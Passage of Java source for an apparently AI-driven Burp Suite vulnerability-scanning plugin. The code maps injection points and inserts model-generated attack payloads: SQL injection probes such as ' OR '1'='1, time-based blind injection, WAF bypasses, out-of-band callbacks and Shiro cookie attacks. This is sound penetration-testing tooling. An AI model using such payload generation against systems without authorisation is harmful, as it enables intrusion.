/*
 * Zack-AI-Scanner —— Burp Suite 的 AI 智能漏洞扫描插件
 * Copyright (C) 2026 Zack AI Scanner
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */
package com.zackai.core;

import com.zackai.i18n.Msg;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import burp.IParameter;
import burp.IRequestInfo;
import com.zackai.model.AIProvider;
import com.zackai.model.ScanTask;
import com.zackai.model.VulnResult;
import com.zackai.ui.LogPanel;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class AIEngine {
    public interface VulnDiscoveryListener {
        void onVulnerabilityFound(ScanTask task, VulnResult vuln);
    }
    
    private static class PayloadResult {
        final int rawCount;
        final JsonArray payloads;
        /** 因为「position 不在 paramVulnMap 里」被丢掉的载荷数（模型自行扩展到别的参数） */
        final int unmappedCount;
        PayloadResult(int rawCount, JsonArray payloads, int unmappedCount) {
            this.rawCount = rawCount;
            this.payloads = payloads;
            this.unmappedCount = unmappedCount;
        }
    }

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private LogPanel logPanel;
    private OkHttpClient httpClient;
    private Gson gson;
    private VulnDiscoveryListener vulnListener;
    /** 上一次已打印的回连域名：域名是全插件共用的，只在变化时打日志 */
    private String lastLoggedOastHost;
    private static final MediaType JSON_TYPE = MediaType.parse("application/json; charset=utf-8");
    // 10 秒：时间盲注载荷（SLEEP/BENCHMARK）必须在超时之前返回，否则调用方拿到的是 null，
    // 连「本次耗时」都没有，这条载荷等于白打（SQL 注入指南因此把睡眠秒数定在 6 秒，
    // 给基线耗时和网络往返留出余量）。判据是本次耗时与基线的差值，见验证提示词。
    private static final int TEST_REQUEST_TIMEOUT_SECONDS = 10;

    /** 整段 body 替换的位置标记（用于 XML 文档、GraphQL、纯文本 body） */
    private static final String WHOLE_BODY_POSITION = "BODY";



    /**
     * 每个「参数-漏洞组合」生成的 payload 条数：1 探测 + 4 主攻 + 4 WAF绕过。
     * 改这个数要同步两处文字：{@link #step3CommonRules()} 里的「第N条」区间，
     * 以及 {@link #buildStep3UserPrompt} 结尾的分段说明 —— 提示词快照只校验字面量，
     * 校验不了这三者是否自洽。
     */
    private static final int PAYLOAD_COUNT_PER_COMBO = 9;

    /**
     * 支持的漏洞类型数（= {@link ScanTask.ScanMode} 里除 CUSTOM 之外的模式数，见 OASTHarness 的断言）。
     * 提示词里的「N种漏洞验证特征」「以下N种标准中文类型」、{@link #VERIFY_FEATURE_HEADER}
     * 以及「paramVulnMap 是否覆盖了全部类型」都用它 —— 以前这个数字在五处各写一遍，
     * 加一种类型时漏改任何一处都是静默失效（提示词里那份类型枚举仍需手工维护）。
     */
    private static final int VULN_TYPE_COUNT = 11;

    /**
     * 报告门限：只有 vulnerable==true 且置信度 >= 95 才记一条漏洞。
     * 默认验证提示词里也写着 >=95（getDefaultVerifyPrompt 的第 6 条与字段说明），
     * 两边必须同时改 —— 只改代码会让模型继续按 95 判、只改提示词则失去约束。
     */
    private static final int CONFIDENCE_REPORT_THRESHOLD = 95;

    /**
     * Step2 提示词里给请求体与响应体的窗口（字符，两者一致）。
     * 判参数类型要看参数值的长相（嵌 JSON、multipart 的 filename、URL 形态）以及响应里的
     * 报错/指纹/回显点，这些常在前后段；步骤2 每次扫描只调用一次，给足上下文很划算。
     * 窗口按**字符**硬截断：以前只按整行累加，遇到压缩成一行的响应（minified JSON/JS）
     * 会把整包塞进提示词，而提示词上写着「前 N 字符」。
     */
    private static final int STEP2_INFO_WINDOW = 10000;

    /**
     * 验证提示词里**四段长输入**的窗口（字符）：本次测试请求、本次测试响应、基线响应、同组合对照响应。
     *
     * <p>**故意只用一个常量**：这四段是给模型**互相比较**用的，同等深度本身就是要点 ——
     * 起止对齐之后，某一处差异不会只出现在一侧（「本次响应里有、基线窗口外」那种没法比对的情况）。
     * 留四个常量迟早会各自漂移。将来真要单独调某一段，那时再拆。
     *
     * <p>2026-09-27 之前是 4000（请求）/ 8000（响应）/ 4000（基线）：证据落在片段外是系统性的漏判，
     * 而窗口是**以证据位置为中心**取的（见 {@link #excerptForPrompt}），放大只增加上下文、不移走证据。
     * 代价是每条载荷的验证输入从 16K 字符涨到 40K —— 这是本功能里最贵的一项，花钱买的是看得见。
     */
    private static final int VERIFY_WINDOW = 10000;

    /** 日志分隔线（十处共用，别在各处再写一遍字面量） */
    private static final String DIVIDER = "─────────────────────────────────────────";

    /**
     * 外带载荷发出后、查询回连记录前的等待秒数（**一次查询，就查这一下**）。
     *
     * <p>DNS 记录要经递归解析器才会落到回连服务上，发完立刻查基本都是空的 ——
     * 而「查空」与「目标根本没回连」在判定上是两回事（前者会让这条载荷失去唯一的证据），
     * 所以留出这几秒。这 6 秒**不阻塞扫描**：载荷发完就接着发下一条，到点了由后台线程回头查。
     *
     * <p>**不做任何补查**（2026-09-27 按「敏捷扫描」要求定稿）：此前有过「查成功但没记录就隔 2 秒
     * 再查一次」「查询失败也补一次」「收尾前再统一补一轮」三种补救，全部去掉了 —— 每条载荷只查一次。
     * 代价要说清楚：解析传播慢于 6 秒的，这次回连就查不到了，那条载荷记「未判定」（**不是**「无漏洞」，
     * 两者在日志与判定上都分得开）。换来的是可预测的收尾时间与更少的对外请求。
     */
    private static final int OOB_POLL_DELAY_SECONDS = 6;

    /**
     * 回连记录确认的漏洞置信度：记录是本次请求专属随机前缀名下的解析，
     * 目标必须真的执行了载荷才会产生 —— 属于确定性证据，直接给满分。
     */
    private static final int OOB_CONFIRMED_CONFIDENCE = 100;

    private boolean isValidPosition(String position, List<String> validParamNames, byte[] requestBytes) {
        if (position == null || position.isEmpty()) return false;
        String trimmed = position.trim();
        if (trimmed.isEmpty()) return false;
        // URL 路径段：URL_PATH 指最后一段，URL_PATH[n] 指第 n 段（0 起）
        if (isUrlPathPosition(trimmed)) {
            return true;
        }
        if (trimmed.equalsIgnoreCase("auto") || trimmed.equalsIgnoreCase("URL")) {
            return false;
        }
        if (trimmed.equalsIgnoreCase(WHOLE_BODY_POSITION)) {
            return true;
        }
        // 先剥掉 header: 前缀再判黑名单，否则 header:host 会绕过黑名单
        String headerName = stripHeaderPrefix(trimmed);
        boolean explicitHeaderSyntax = !headerName.equals(trimmed);
        if (isHeaderParameter(headerName)) {
            return false;
        }
        if (explicitHeaderSyntax) {
            return true;
        }
        if (isInjectableHeader(headerName)) {
            return true;
        }
        if (validParamNames != null) {
            for (String validName : validParamNames) {
                if (validName != null && validName.equalsIgnoreCase(trimmed)) {
                    return true;
                }
            }
        }
        // 兜底判据：位置在请求里**真的存在**就算合法。
        // Burp 的参数模型覆盖不到所有注入点 —— JSON 嵌套字段报的是叶子名还是全路径由 Burp 决定、
        // multipart 只报部件属性（filename/name）、XML 元素名也不一定出现在参数表里，
        // 而这些位置注入层都能注进去（modifyJsonRequest / modifyMultipartRequest /
        // modifyXmlRequest 各认一套写法）。只认 Burp 参数名的话，嵌套 JSON 与 multipart 部件的
        // 映射会在 Step2 就被整条丢掉，用户只看到一行「丢弃 N 条无法注入的参数映射」。
        // Step2 与 Step3 必须用同一个判据（此前两处都调这个方法，就是为此）。
        return this.positionExistsInRequest(trimmed, requestBytes);
    }

    /**
     * position 是否在请求里真实存在 —— Burp 参数表之外的兜底判据，与注入层一一对应：
     * JSON 路径能在 body 里取到、multipart 里有这个部件名、XML 里有这个元素、或 body 里写着 {@code 位置=}。
     *
     * <p>全部按**原始请求文本**判断，不经过 Burp：一是这里只需要「请求里写着的」内容，
     * 二是离线 harness 里 helpers 是 null（{@code new AIEngine(null, null, logPanel, null)} 是允许的写法），
     * 走 Burp 会让这些分支在测试里恒为 false、等于没测。
     */
    private boolean positionExistsInRequest(String position, byte[] requestBytes) {
        if (requestBytes == null || requestBytes.length == 0) return false;
        String contentType = headerValueOf(requestBytes, "content-type");
        String body = bodyOf(requestBytes);
        if (body == null) return false;
        if (contentType != null) {
            if (isJsonContentType(contentType)) {
                return this.jsonPathExists(body, position);
            }
            if (isXmlContentType(contentType)) {
                // 直接复用注入层的定位函数：它能替换的位置，就是我们能注入的位置
                return this.replaceXmlElementText(body, position, "probe") != null;
            }
            if (isMultipartContentType(contentType)) {
                return multipartPartExists(body, position);
            }
        }
        return bodyParamExists(body, position);
    }

    /** JSON body 里能不能按路径取到这个值（与 modifyJsonRequest 的判据相同） */
    private boolean jsonPathExists(String body, String position) {
        List<JsonPathSegment> segments = parseJsonPath(position);
        if (segments.isEmpty()) return false;
        try {
            JsonObject root = this.gson.fromJson(body, JsonObject.class);
            if (root == null) return false;
            return jsonPathGet(root, segments) != null;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * multipart body 里有没有这个部件（或 {@code position=filename} 时的 filename 属性）。
     * 只看文本形态：二进制部件同样能用整段替换注入，而部件名总在文本的 Content-Disposition 里。
     */
    private static boolean multipartPartExists(String body, String position) {
        String lower = body.toLowerCase(java.util.Locale.ROOT);
        String wanted = position.toLowerCase(java.util.Locale.ROOT);
        if (wanted.equals("filename")) {
            return lower.contains("filename=");
        }
        for (String attr : new String[]{"name=\"", "name="}) {
            int at = 0;
            while ((at = lower.indexOf(attr, at)) >= 0) {
                int start = at + attr.length();
                if (lower.startsWith(wanted, start)) {
                    int after = start + wanted.length();
                    if (after >= lower.length()) return true;
                    char c = lower.charAt(after);
                    if (c == '"' || c == ';' || c == '\r' || c == '\n' || c == ' ' || c == '\t') {
                        return true;
                    }
                }
                at = start;
            }
        }
        return false;
    }

    /** body 里是否以「参数名=」的形态出现（表单/文本 body；JSON 的键不带 =，不会误判） */
    private static boolean bodyParamExists(String body, String position) {
        return java.util.regex.Pattern
                .compile("(?<![A-Za-z0-9_])" + java.util.regex.Pattern.quote(position) + "=",
                        java.util.regex.Pattern.CASE_INSENSITIVE)
                .matcher(body).find();
    }

    /** 请求头区的值（只看 header 区，body 里出现同名字符串不算）；没有这个头返回 null */
    private static String headerValueOf(byte[] requestBytes, String headerName) {
        if (requestBytes == null || requestBytes.length == 0) return null;
        int bodyStart = bodyStartOffset(requestBytes);
        int end = bodyStart < 0 ? requestBytes.length : bodyStart;
        // ISO-8859-1 是按字节 1:1 映射的，用它只是为了能按字符下标切分，不涉及解码语义
        String headerRegion = new String(requestBytes, 0, end, StandardCharsets.ISO_8859_1);
        String lower = headerRegion.toLowerCase(java.util.Locale.ROOT);
        String needle = headerName.toLowerCase(java.util.Locale.ROOT) + ":";
        int at = 0;
        while ((at = lower.indexOf(needle, at)) >= 0) {
            boolean lineStart = at == 0 || headerRegion.charAt(at - 1) == '\n';
            int lineEnd = headerRegion.indexOf('\n', at);
            if (lineEnd < 0) lineEnd = headerRegion.length();
            if (lineStart) {
                return headerRegion.substring(at + needle.length(), lineEnd).trim();
            }
            at = lineEnd;
        }
        return null;
    }

    /** 请求里出现的 cookie 名（小写）。Cookie 头是纯文本，自己解析即可，不必依赖 Burp 的参数模型 */
    private static Set<String> cookieNamesOf(byte[] requestBytes) {
        Set<String> names = new HashSet<String>();
        String cookieHeader = headerValueOf(requestBytes, "cookie");
        if (cookieHeader == null || cookieHeader.isEmpty()) return names;
        for (String pair : cookieHeader.split(";")) {
            int eq = pair.indexOf('=');
            String name = (eq < 0 ? pair : pair.substring(0, eq)).trim().toLowerCase(java.util.Locale.ROOT);
            if (!name.isEmpty()) {
                names.add(name);
            }
        }
        return names;
    }

    /** 请求本身是不是 multipart（只看 Content-Type 头） */
    private static boolean isMultipartRequest(byte[] requestBytes) {
        String contentType = headerValueOf(requestBytes, "content-type");
        return contentType != null && contentType.toLowerCase(java.util.Locale.ROOT).contains("multipart/");
    }

    /**
     * 请求里 multipart 部件的名字（小写）。理由与 {@link #cookieNamesOf} 相同：从原始字节里自己解析，
     * 不信 Burp 的参数模型 —— 同一个上传面它可能报成部件名（{@code file}），也可能只报
     * {@code filename} 属性。仅当 Content-Type 是 multipart 时才扫。
     */
    private static Set<String> multipartPartNamesOf(byte[] requestBytes) {
        Set<String> names = new HashSet<String>();
        if (!isMultipartRequest(requestBytes)) return names;
        String body = bodyOf(requestBytes);
        if (body == null || body.isEmpty()) return names;
        String lower = body.toLowerCase(java.util.Locale.ROOT);
        for (String attr : new String[]{"name=\"", "name="}) {
            int at = 0;
            while ((at = lower.indexOf(attr, at)) >= 0) {
                int attrAt = at;
                at += attr.length();
                // 排除 filename="…" / filename=… —— 属性名前必须是分隔符，否则匹配到的是 filename 里的 name
                char prev = attrAt > 0 ? lower.charAt(attrAt - 1) : ';';
                if (prev != ';' && prev != ' ' && prev != '\t' && prev != '\r' && prev != '\n') continue;
                char stop = attr.endsWith("\"") ? '"' : '\0';
                int end = at;
                while (end < lower.length()) {
                    char c = lower.charAt(end);
                    if (stop != '\0' ? c == stop
                            : (c == ';' || c == '\r' || c == '\n' || c == ' ' || c == '\t')) {
                        break;
                    }
                    ++end;
                }
                if (end > at) names.add(lower.substring(at, end));
            }
        }
        return names;
    }

    /** Burp 会把 multipart 部件的属性报成同名参数；它与该部件本身是同一个注入点 */
    private static boolean isMultipartAttrKey(String key) {
        return "filename".equals(key) || "name".equals(key);
    }

    /** body 起始偏移（header 区后的空行之后）；没有 body（找不到空行）返回 -1 */
    private static int bodyStartOffset(byte[] requestBytes) {
        String text = new String(requestBytes, StandardCharsets.ISO_8859_1);
        int crlf = text.indexOf("\r\n\r\n");
        int lf = text.indexOf("\n\n");
        if (crlf >= 0 && (lf < 0 || crlf < lf)) return crlf + 4;
        if (lf >= 0) return lf + 2;
        return -1;
    }

    /** body 文本（UTF-8 解码）；没有 body 返回 null */
    private static String bodyOf(byte[] requestBytes) {
        int start = bodyStartOffset(requestBytes);
        if (start < 0 || start >= requestBytes.length) return null;
        return new String(requestBytes, start, requestBytes.length - start, StandardCharsets.UTF_8);
    }

    /** position 是不是 URL 路径段写法：URL_PATH（最后一段）或 URL_PATH[下标] */
    static boolean isUrlPathPosition(String position) {
        if (position == null) return false;
        String upper = position.trim().toUpperCase();
        return upper.equals("URL_PATH") || upper.startsWith("URL_PATH[");
    }

    /** 解析 URL_PATH[n] 里的下标；URL_PATH（无下标）返回 -1 表示「最后一段」 */
    private static int urlPathIndex(String position) {
        String upper = position.trim().toUpperCase();
        int open = upper.indexOf('[');
        if (open < 0) return -1;
        int close = upper.indexOf(']', open + 1);
        if (close < 0) return -2;      // 写法残缺 → 调用方按无法注入处理
        try {
            return Integer.parseInt(upper.substring(open + 1, close).trim());
        } catch (Exception e) {
            return -2;
        }
    }

    /**
     * 替换 URL 路径里的某一段（REST 风格注入点：/api/user/123、/order/1001/detail）。
     *
     * <p>为什么单独做：这类位置没有参数名，Burp 的参数模型里也不存在，所以只能按字节在原请求行里
     * 定位——路径段用 {@code /} 分隔，查询串（{@code ?} 之后）不算路径。
     * {@code URL_PATH} 指最后一段，{@code URL_PATH[n]} 指第 n 段（0 起）。
     *
     * <p>载荷里的空格 / {@code ?} / {@code #} 会破坏请求行，这里就地编码成 %20 / %3F / %23；
     * {@code /} 与 {@code .} 保持原样（路径穿越载荷就靠它们）。
     */
    private byte[] modifyUrlPath(byte[] originalRequest, String payload, String position) {
        try {
            if (payload == null || payload.isEmpty()) return null;
            int lineEnd = 0;
            while (lineEnd < originalRequest.length
                    && originalRequest[lineEnd] != '\r' && originalRequest[lineEnd] != '\n') {
                ++lineEnd;
            }
            String requestLine = new String(originalRequest, 0, lineEnd, StandardCharsets.ISO_8859_1);
            int firstSpace = requestLine.indexOf(' ');
            if (firstSpace < 0) return null;
            int targetStart = firstSpace + 1;
            int targetEnd = requestLine.indexOf(' ', targetStart);
            if (targetEnd < 0) targetEnd = lineEnd;
            String target = requestLine.substring(targetStart, targetEnd);
            int queryAt = target.indexOf('?');
            int pathEnd = queryAt < 0 ? targetEnd : targetStart + queryAt;

            // 收集非空路径段的 [start, end) 偏移（相对整个请求）
            List<int[]> segments = new ArrayList<int[]>();
            int cursor = targetStart;
            while (cursor < pathEnd) {
                while (cursor < pathEnd && originalRequest[cursor] == '/') ++cursor;
                int segStart = cursor;
                while (cursor < pathEnd && originalRequest[cursor] != '/') ++cursor;
                if (cursor > segStart) {
                    segments.add(new int[]{segStart, cursor});
                }
            }
            if (segments.isEmpty()) return null;

            int index = urlPathIndex(position);
            if (index == -2) return null;
            if (index == -1) index = segments.size() - 1;
            if (index < 0 || index >= segments.size()) return null;

            int[] seg = segments.get(index);
            byte[] payloadBytes = encodeForRequestLine(payload);
            byte[] result = new byte[originalRequest.length - (seg[1] - seg[0]) + payloadBytes.length];
            System.arraycopy(originalRequest, 0, result, 0, seg[0]);
            System.arraycopy(payloadBytes, 0, result, seg[0], payloadBytes.length);
            System.arraycopy(originalRequest, seg[1], result, seg[0] + payloadBytes.length,
                    originalRequest.length - seg[1]);
            return result;
        } catch (Exception e) {
            this.logPanel.logError(Msg.t("log.send.urlPathInjectFailed", position), e);
            return null;
        }
    }

    /** 请求行里不能出现的字符（会截断路径 / 伪造查询串 / 空格会被当成请求行分隔符）就地百分号编码 */
    private static byte[] encodeForRequestLine(String payload) {
        StringBuilder sb = new StringBuilder(payload.length() + 8);
        for (int i = 0; i < payload.length(); i++) {
            char c = payload.charAt(i);
            switch (c) {
                case ' ': sb.append("%20"); break;
                case '?': sb.append("%3F"); break;
                case '#': sb.append("%23"); break;
                default:
                    // 控制字符（CR/LF/TAB、DEL）必须编码：URL_PATH 是**唯一**不再经过其它净化的注入路径
                    //（请求头剔 CR/LF、cookie 值剔 CR/LF、参数值由 needsUrlEncoding 编掉控制字符），
                    // 载荷里一个真换行就能把请求行劈开，后面的内容会变成伪造的请求头/请求。
                    if (c < 0x20 || c == 0x7f) {
                        sb.append(String.format("%%%02X", (int) c));
                    } else {
                        sb.append(c);
                    }
            }
        }
        return sb.toString().getBytes(StandardCharsets.UTF_8);
    }

    /** Cookie 这一族在 paramVulnMap 对比时用的统一键（见 {@link #mappedParamsOf}） */
    private static final String COOKIE_POSITION_KEY = "cookie";

    /**
     * 这个名字是不是「Shiro 的 cookie 名，但请求里可能以**别的形态**出现」。
     *
     * <p>实测场景（2026-09-24，Shiro 靶场）：登录页有 Remember Me 复选框，请求体里是
     * {@code username=admin&password=admin&rememberMe=on&submit=Login}，而 Cookie 头里只有
     * JSESSIONID。步骤 2 看着「请求里有 rememberMe」照实写 {@code rememberMe}，步骤 3 按指南
     * 写 {@code header:Cookie}（因为攻击必须往 Cookie 头上加，表单里的同名字段 Shiro 根本不看）——
     * 两个键对不上，**全部载荷被判「不在 paramVulnMap 里」丢掉**，任务报「AI 未生成有效 payload」，
     * 用户看到的是「Shiro 扫不了」。
     *
     * <p>{@link #cookieNamesOf} 只认请求 Cookie 头里真实存在的名字，认不出这种「同名表单字段」，
     * 所以这一类名字要单独放行：它们指的就是 Cookie 这个注入面。
     */
    private static boolean isCookieFamilyName(String key) {
        return "rememberme".equals(key);
    }

    /**
     * paramVulnMap 里点名的位置（归一化后的键）。
     *
     * <p>Step3 生成的载荷只允许打这些位置 —— 模型自行扩展到别的参数，等于对「AI 判断没有漏洞」
     * 的参数也发一遍 PoC，用户看到的就变成「每个参数都在发包」。
     *
     * <p>除了一一对应的键，还要给 Cookie 这一族补上别名：Step2 与 Step3 对同一个注入点
     * 经常写成不同形态 —— Shiro 的指南明确允许「请求里有 rememberMe 就写 rememberMe、
     * 没有就写 header:Cookie」，而 Step2 只会写其中一种。键对不上时载荷会被当成
     * 「不在 paramVulnMap 里」整条丢掉（Shiro 扫描会一条载荷都发不出去，且只看日志的话
     * 只是一行「丢弃 N 条」）。这里按请求里真实存在的 cookie 名把两种写法都补进集合。
     *
     * @param requestBytes 本次扫描的请求字节（用于取 cookie 名）；为 null 时只做普通归一化
     */
    private Set<String> mappedParamsOf(JsonObject step2Result, byte[] requestBytes) {
        Set<String> mapped = new HashSet<String>();
        if (step2Result == null || !step2Result.has("paramVulnMap")) return mapped;
        JsonArray map = step2Result.getAsJsonArray("paramVulnMap");
        if (map == null) return mapped;
        Set<String> cookieNames = cookieNamesOf(requestBytes);
        Set<String> partNames = multipartPartNamesOf(requestBytes);
        for (JsonElement elem : map) {
            if (elem == null || !elem.isJsonObject()) continue;
            String param = safeGetString(elem.getAsJsonObject(), "param", "");
            String key = normalizeParamKey(param);
            if (key.isEmpty()) continue;
            mapped.add(key);
            if (COOKIE_POSITION_KEY.equals(key) || cookieNames.contains(key) || isCookieFamilyName(key)) {
                mapped.add(COOKIE_POSITION_KEY);
                mapped.addAll(cookieNames);
            }
            // multipart 的**一个部件 = 一个注入点**：部件名（file）与它的 filename/name 属性是同一个点，
            // 可步骤 2、步骤 3 是两次独立生成，模型一边写 file、一边写 filename 就会把整类载荷判成
            // 「不在映射里」丢掉 —— 文件上传 0 发包、任务报「安全」。两边的提示词都允许这两种写法
            //（步骤 2 的提示词就是让模型「照请求里的写法填」，而请求体里写着 filename="a.png"）。
            // 与 Cookie 家族同一套处理方式；但**只在请求真的是 multipart 时**补，且部件名 → 属性的
            // 方向只补属性名（不把别的部件也一起放行，别名不等于无条件放行）。
            if (partNames.contains(key)) {
                mapped.add("filename");
                mapped.add("name");
            } else if (isMultipartAttrKey(key) && !partNames.isEmpty()) {
                // 反过来：属性名不指向具体部件（Burp 把各部件上的同名属性报成同一个参数），
                // 所以只能把请求里的部件名都放行 —— 这是这个方向唯一能做的判断。
                mapped.addAll(partNames);
            }
        }
        return mapped;
    }

    /**
     * paramVulnMap 里出现的漏洞类型（标准中文名，与 {@link ScanTask.ScanMode#getDisplayName()} 对齐）。
     * Step3 的指南与验证特征块都按它裁剪 —— 模型不判的类型不必发指南，省 token 也少干扰。
     * 类型名认不出来的直接丢掉（formatVulnName 返回「未知漏洞」）。
     */
    private Set<String> mappedTypesOf(JsonObject step2Result) {
        Set<String> types = new LinkedHashSet<String>();
        if (step2Result == null || !step2Result.has("paramVulnMap")) return types;
        JsonArray map = step2Result.getAsJsonArray("paramVulnMap");
        if (map == null) return types;
        for (JsonElement elem : map) {
            if (elem == null || !elem.isJsonObject()) continue;
            JsonObject mapping = elem.getAsJsonObject();
            JsonArray vulnTypes = mapping.has("vulnTypes") ? mapping.getAsJsonArray("vulnTypes") : null;
            if (vulnTypes == null) continue;
            for (JsonElement vt : vulnTypes) {
                if (vt == null || vt.isJsonNull()) continue;
                String name = formatVulnName(vt.getAsString());
                if (name != null && !name.isEmpty() && !"未知漏洞".equals(name)) {
                    types.add(name);
                }
            }
        }
        return types;
    }

    /**
     * 本次真正要发给模型的类型（按固定顺序）：只保留 paramVulnMap 里出现的那些。
     * 一个都没解析出来时退回全量 —— 宁可多发指南，也不要在映射写得不规范时把指南发空。
     */
    private static List<ScanTask.ScanMode> wantedModes(Set<String> mappedTypes, ScanTask.ScanMode[] allModes) {
        List<ScanTask.ScanMode> wanted = new ArrayList<ScanTask.ScanMode>();
        if (mappedTypes != null && !mappedTypes.isEmpty()) {
            for (ScanTask.ScanMode m : allModes) {
                if (mappedTypes.contains(m.getDisplayName())) {
                    wanted.add(m);
                }
            }
        }
        return wanted.isEmpty() ? Arrays.asList(allModes) : wanted;
    }

    /**
     * 参数名归一化：小写 + 剥掉 header: 前缀 + 把所有 URL_PATH 写法折叠成同一个键。
     *
     * <p>Step2 可能写 header:User-Agent，Step3 可能写成 User-Agent（或反过来），两种都要能对上。
     *
     * <p>URL_PATH 这一族必须折叠：Step2 的提示词允许模型写 {@code URL_PATH}（指最后一段）
     * 或 {@code URL_PATH[下标]}，而 Step3 侧判「在不在 paramVulnMap 里」时是在比键 ——
     * 不折叠的话 {@code url_path[1]} 与 {@code url_path} 是两个不同的键，
     * Step2 写了下标写法就会把 Step3 的**全部**路径载荷判成「不在映射里」丢掉
     * （路径注入就此整类失效，任务还可能以「安全」结束）。离线实测：Step2 写 URL_PATH[0] 时，
     * position 为 URL_PATH / URL_PATH[0..2] 的载荷 4 条全丢。
     */
    private static String normalizeParamKey(String name) {
        if (name == null) return "";
        String key = name.trim().toLowerCase();
        if (key.startsWith("header:")) {
            key = key.substring(7).trim();
        }
        if (isUrlPathPosition(key)) {
            return URL_PATH_KEY;
        }
        return key;
    }

    /** URL_PATH 一族在 paramVulnMap 对比时用的统一键（见 {@link #normalizeParamKey}） */
    private static final String URL_PATH_KEY = "url_path";

    /**
     * 载荷的 position 是否指向 paramVulnMap 里列出的参数；BODY（整段 body 替换）不针对具体参数，始终放行。
     *
     * <p>比较用的两侧都过 {@link #normalizeParamKey}，所以 {@code header:Cookie} 与 {@code Cookie}、
     * {@code URL_PATH[2]} 与 {@code URL_PATH} 会落到同一个键上 —— 两个阶段对同一个注入点
     * 写法不一致是常态，判据必须是「指的是不是同一个注入点」而不是「字符串是否相等」。
     */
    private static boolean isMappedPosition(String position, Set<String> mappedParams) {
        if (position == null) return false;
        String trimmed = position.trim();
        if (trimmed.equalsIgnoreCase(WHOLE_BODY_POSITION)) return true;
        if (mappedParams == null || mappedParams.isEmpty()) return false;
        return mappedParams.contains(normalizeParamKey(trimmed));
    }

    /** multipart「一个部件 = 一个注入点」在对照锚点里用的统一键（部件名与它的 filename/name 属性同键） */
    private static final String MULTIPART_PART_KEY = "multipart_part";

    /**
     * 对照锚点用的位置键：比 {@link #normalizeParamKey} 多折一层「同一个注入点、两种写法」的别名。
     *
     * <p>锚点靠**位置键 + 漏洞类型**把同一个组合的第 1 条载荷与后面的载荷配对。键对不上就是**静默失效**：
     * 这个组合永远配不到对照，日志里一句话都不说。所以要折的别名和 {@link #mappedParamsOf} 一致：
     * <ul>
     *   <li>Cookie 家族：{@code header:Cookie} / 请求里真实存在的 cookie 名 / {@code rememberMe}
     *       （Shiro 的指南同时允许这几种写法，见 {@link #isCookieFamilyName}）</li>
     *   <li>multipart：部件名与它的 {@code filename}/{@code name} 属性是同一个注入点</li>
     * </ul>
     * URL_PATH 一族已经由 {@link #normalizeParamKey} 折好了。
     */
    private static String anchorPositionKey(String position, byte[] requestBytes) {
        String key = normalizeParamKey(position);
        if (key.isEmpty()) return "";
        if (COOKIE_POSITION_KEY.equals(key) || isCookieFamilyName(key)
                || cookieNamesOf(requestBytes).contains(key)) {
            return COOKIE_POSITION_KEY;
        }
        Set<String> partNames = multipartPartNamesOf(requestBytes);
        if (!partNames.isEmpty() && (partNames.contains(key) || isMultipartAttrKey(key))) {
            return MULTIPART_PART_KEY;
        }
        return key;
    }

    /**
     * 一个「参数 × 漏洞类型」组合的对照锚点键。类型走 {@link #formatVulnName} 归一化 ——
     * 模型的 type 字段这次可能写 {@code sql_injection}、下次写 {@code SQL注入}，
     * 而同一个组合的 9 条载荷必须落到同一个键上。
     */
    private String comboAnchorKey(String position, String vulnType, byte[] requestBytes) {
        String posKey = anchorPositionKey(position, requestBytes);
        if (posKey.isEmpty()) return "";
        return posKey + "|" + this.formatVulnName(vulnType);
    }

    /**
     * 一个组合的**对照锚点**：该组合第 1 条载荷（探测载荷）的响应。
     *
     * <p>用途见 {@link #buildProbeAnchorBlock}：后续载荷的验证提示词里带上它，模型才做得了
     * 「恒真 vs 恒假」这类**成对**判读 —— 提示词一直在要求这件事（SQL 特征块的验证方法就写着
     * 「对比载荷 ' OR '1'='1 vs ' OR '1'='2 的响应」），可这两条载荷是在两次互不知情的调用里
     * 分别判的，模型手里永远只有一条。
     *
     * <p>不可变：字段全 final，{@code byte[]} 无人改写。一个组合一条，上界是参数数 × 类型数。
     */
    private static class ProbeAnchor {
        final String payload;
        final byte[] response;
        final long elapsedMs;
        /** 记这条锚点时的显示序号：本条载荷自己不做自己的对照（相等即视为无对照） */
        final int displayIndex;

        ProbeAnchor(String payload, byte[] response, long elapsedMs, int displayIndex) {
            this.payload = payload;
            this.response = response;
            this.elapsedMs = elapsedMs;
            this.displayIndex = displayIndex;
        }
    }

    /**
     * 记录对照锚点：只记**该组合的第一条**、且只记真的拿到了响应的那一条。
     *
     * <p>调用点必须放在载荷循环里、拿到响应之后的**最早处**：这条载荷很可能正是会被
     * 「与基线无差异即无漏洞」跳过的那条，等进了 processTestResult 再记就正好丢掉了要用的字节；
     * 而且外带载荷的 processTestResult 是 5 秒后在调度线程上跑的，在那里记会和发送顺序错位。
     *
     * @param kind 步骤3 给的载荷标记；明确写了 attack/bypass 的**一律不当对照** ——
     *             一条被 WAF 拦掉或被报错吃掉的载荷冒充「正常业务响应」，会让后面与基线一致的载荷
     *             看起来像「绕过了拦截」，那是误报生成器
     */
    private void recordProbeAnchor(Map<String, ProbeAnchor> anchors, String position, String vulnType,
                                   byte[] requestBytes, String payload, IHttpRequestResponse testResponse,
                                   long elapsedMs, int displayIndex, String kind) {
        if (anchors == null || testResponse == null) return;
